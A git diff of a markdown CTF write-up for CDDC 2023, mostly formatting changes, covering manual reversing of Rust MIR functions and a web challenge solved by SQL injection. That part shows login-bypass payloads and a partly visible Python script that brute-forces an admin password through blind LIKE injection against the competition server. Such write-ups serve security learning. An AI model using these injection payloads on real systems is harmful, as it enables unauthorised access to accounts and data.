@@ -3,7 +3,7 @@ title: CDDC 2023
 slug: CDDC-2023
 author: [kane]
 date: 2023-07-05
-tags: [ctf,writeup]
+tags: [ctf, writeup]
 ---
 
 ## In the middle of Rust
@@ -17,56 +17,59 @@ We decided to do the stupid thing and manually reverse it by hand, painstakingly
 Let's dig into the main function first:
 It first defines like 120 variables, but we can worry about that later. the nested `scope{ }` are also all useless.
 
-We see a lot of `bb0`, `bb1`, etc, those are *basic blocks* inside the `.mir` file. They represent a sequence of instructions or statements, and determine how the program flows. Let's start with `bb0` in `main`:
+We see a lot of `bb0`, `bb1`, etc, those are _basic blocks_ inside the `.mir` file. They represent a sequence of instructions or statements, and determine how the program flows. Let's start with `bb0` in `main`:
 
 ```rust
 bb0: {
-    _1 = func001(const 126_u8) -> bb1;                                   
+    _1 = func001(const 126_u8) -> bb1;
 }
 ```
+
 where `func001` is:
+
 ```rust
 fn func001(_1: u8) -> u8 {
-    debug ch => _1;                      
-    let mut _0: u8;                      
-    let mut _2: u8;                      
-    let mut _3: (u8, bool);              
-    let mut _4: u8;                      
-    let mut _5: u8;                      
-    let mut _6: (u8, bool);              
-    let mut _7: (u8, bool);              
+    debug ch => _1;
+    let mut _0: u8;
+    let mut _2: u8;
+    let mut _3: (u8, bool);
+    let mut _4: u8;
+    let mut _5: u8;
+    let mut _6: (u8, bool);
+    let mut _7: (u8, bool);
     scope 1 {
-        debug retn => _0;                
+        debug retn => _0;
     }
 
     bb0: {
-        _0 = _1;                         
-        _2 = _0;                         
+        _0 = _1;
+        _2 = _0;
         _3 = CheckedShr(_2, const 3_i32); // rshift _3 by 3
-        assert(!move (_3.1: bool), "attempt to shift right by `{}`, which would overflow", const 3_i32) -> bb1; 
+        assert(!move (_3.1: bool), "attempt to shift right by `{}`, which would overflow", const 3_i32) -> bb1;
     }
 
     bb1: {
         _0 = move (_3.0: u8);
         _5 = _0;
         _6 = CheckedMul(_5, const 4_u8); // multiply _5 by 4
-        assert(!move (_6.1: bool), "attempt to compute `{} * {}`, which would overflow", move _5, const 4_u8) -> bb2; 
+        assert(!move (_6.1: bool), "attempt to compute `{} * {}`, which would overflow", move _5, const 4_u8) -> bb2;
     }
 
     bb2: {
-        _4 = move (_6.0: u8);            
+        _4 = move (_6.0: u8);
         _7 = CheckedAdd(_4, const 7_u8); // add 7 to _4
-        assert(!move (_7.1: bool), "attempt to compute `{} + {}`, which would overflow", move _4, const 7_u8) -> bb3; 
+        assert(!move (_7.1: bool), "attempt to compute `{} + {}`, which would overflow", move _4, const 7_u8) -> bb3;
     }
 
     bb3: {
-        _0 = move (_7.0: u8);            
-        return;                          
+        _0 = move (_7.0: u8);
+        return;
     }
 }
 ```
 
 Which is basically:
+
 ```rust
 bb0: {
     _1 = (126 >> 3) * 4 + 7 -> bb1; // 67
@@ -74,13 +77,15 @@ bb0: {
 ```
 
 Now let's see `bb1`:
+
 ```rust
 bb1: {
-    _3 = _1;                         
-    _2 = move _3 as char (IntToInt); 
-	_4 = func002(const 51_u8) -> bb2; 
+    _3 = _1;
+    _2 = move _3 as char (IntToInt);
+	_4 = func002(const 51_u8) -> bb2;
 }
 ```
+
 We see it makes a a char labelled `_2`, which I assume is the characters of the flag. It also tries to feed `bb2`, the next block, with `func002(51)`, which will later become another character in the flag. From now on we just focused on evaluating these `funcxxx()` and its output.
 
 The next several functions are all elementary ones, comprising of addition, subtraction, multiplication, division, and bitwise operators.
@@ -106,9 +111,9 @@ fn func010(_1: u8) -> u8 {
     }
 
     bb0: {
-        _0 = _1;                         
+        _0 = _1;
         _3 = std::ops::Range::<i32> { start: const 0_i32, end: const 10_i32 };  // loop of count 10
-        _2 = <std::ops::Range<i32> as IntoIterator>::into_iter(move _3) -> bb1; 
+        _2 = <std::ops::Range<i32> as IntoIterator>::into_iter(move _3) -> bb1;
     }
 
     bb1: {
@@ -136,7 +141,7 @@ fn func010(_1: u8) -> u8 {
     }
 
     bb6: {
-        return;                     
+        return;
     }
 
     bb7: {
@@ -147,7 +152,7 @@ fn func010(_1: u8) -> u8 {
 ```
 
 It is essentially a for loop of 10, and each time it loops `_0` gets incremented by 1 (via `_8`)
-Therefore `func010(109) = 119` which corresponds to ``'w'``
+Therefore `func010(109) = 119` which corresponds to `'w'`
 
 The next several functions are also elementary ones, comprising of addition, subtraction, multiplication, division, and bitwise operators, and also exponentiation.
 
@@ -247,71 +252,71 @@ The last weird function is `func033`;
 
 ```rust
 fn func033(_1: u8) -> u8 {
-    debug ch => _1;                      
-    let mut _0: u8;                      
-    let mut _2: std::ops::Range<i32>;    
-    let mut _3: std::ops::Range<i32>;    
-    let mut _5: std::option::Option<i32>; 
-    let mut _6: &mut std::ops::Range<i32>; 
-    let mut _7: isize;                   
-    let mut _9: i32;                     
-    let mut _10: (u8, bool);             
+    debug ch => _1;
+    let mut _0: u8;
+    let mut _2: std::ops::Range<i32>;
+    let mut _3: std::ops::Range<i32>;
+    let mut _5: std::option::Option<i32>;
+    let mut _6: &mut std::ops::Range<i32>;
+    let mut _7: isize;
+    let mut _9: i32;
+    let mut _10: (u8, bool);
     scope 1 {
-        debug retn => _0;                
-        let mut _4: std::ops::Range<i32>; 
+        debug retn => _0;
+        let mut _4: std::ops::Range<i32>;
         scope 2 {
-            debug iter => _4;            
-            let _8: i32;                 
+            debug iter => _4;
+            let _8: i32;
             scope 3 {
-                debug i => _8;           
+                debug i => _8;
             }
         }
     }
 
     bb0: {
-        _0 = _1;  // 106                       
-        _3 = std::ops::Range::<i32> { start: const 0_i32, end: const 10_i32 }; 
-        _2 = <std::ops::Range<i32> as IntoIterator>::into_iter(move _3) -> bb1; 
-                                         
+        _0 = _1;  // 106
+        _3 = std::ops::Range::<i32> { start: const 0_i32, end: const 10_i32 };
+        _2 = <std::ops::Range<i32> as IntoIterator>::into_iter(move _3) -> bb1;
+
     }
 
     bb1: {
-        _4 = move _2;                    
-        goto -> bb2;                     
+        _4 = move _2;
+        goto -> bb2;
     }
 
     bb2: {
-        _6 = &mut _4;                    
-        _5 = <std::ops::Range<i32> as Iterator>::next(_6) -> bb3; 
+        _6 = &mut _4;
+        _5 = <std::ops::Range<i32> as Iterator>::next(_6) -> bb3;
     }
 
     bb3: {
-        _7 = discriminant(_5);           
-        switchInt(move _7) -> [0: bb6, 1: bb4, otherwise: bb5]; 
+        _7 = discriminant(_5);
+        switchInt(move _7) -> [0: bb6, 1: bb4, otherwise: bb5];
     }
 
     bb4: {
-        _8 = ((_5 as Some).0: i32);      
-        _9 = Rem(_8, const 2_i32);       
-        switchInt(move _9) -> [0: bb7, otherwise: bb2]; 
+        _8 = ((_5 as Some).0: i32);
+        _9 = Rem(_8, const 2_i32);
+        switchInt(move _9) -> [0: bb7, otherwise: bb2];
     }
 
     bb5: {
-        unreachable;                     
+        unreachable;
     }
 
     bb6: {
-        return;                          
+        return;
     }
 
     bb7: {
-        _10 = CheckedAdd(_0, const 1_u8); 
-        assert(!move (_10.1: bool), "attempt to compute `{} + {}`, which would overflow", _0, const 1_u8) -> bb8; 
+        _10 = CheckedAdd(_0, const 1_u8);
+        assert(!move (_10.1: bool), "attempt to compute `{} + {}`, which would overflow", _0, const 1_u8) -> bb8;
     }
 
     bb8: {
-        _0 = move (_10.0: u8);           
-        goto -> bb2;                     
+        _0 = move (_10.0: u8);
+        goto -> bb2;
     }
 }
 ```
@@ -342,15 +347,19 @@ Tags: web
 So we are given a username and password field. I tried username `admin` and password `' or 1=1;#` and it worked - it just said "Hello admin" - so it is vulnerable to SQL Injection
 
 I assumed that the query was something like this:
+
 ```SQL
 SELECT <thing> FROM <thetable> WHERE id = '{id}' AND pw = '{pw}';
 ```
 
 We see that the url is `http://52.78.16.36:8881/web1/?id=admin&pw=password`, so the column name is probably `pw`, so we can inject:
+
 ```
 ' or 1=1 or pw LIKE '%';#
 ```
+
 We then replace the `%` with increasingly many `_` until we find one that matches - oh wait it says "no hack", so that probably does not work. Whatever since `%` is not filtered lets use that to get the password:
+
 ```python
 import requests
 base = "http://52.78.16.36:8881/web1/"
@@ -374,4 +383,5 @@ while True:
         print("Wrong: "+pw)
         id += 1
 ```
+
 the result is `end: ' OR pw LIKE 'ADMIN123PW⌂%';#`, and ignoring the last few bits we get `ADMIN123PW`, but that still doesnt give us the flag. Since `LIKE` is not case-senstive, and we can't using `SUBSTRING` since I dont know the table name, we can only try for different combinations of upper and lowercase. I tried all lowercase instead (i.e. `admin123pw`) and I got the flag.
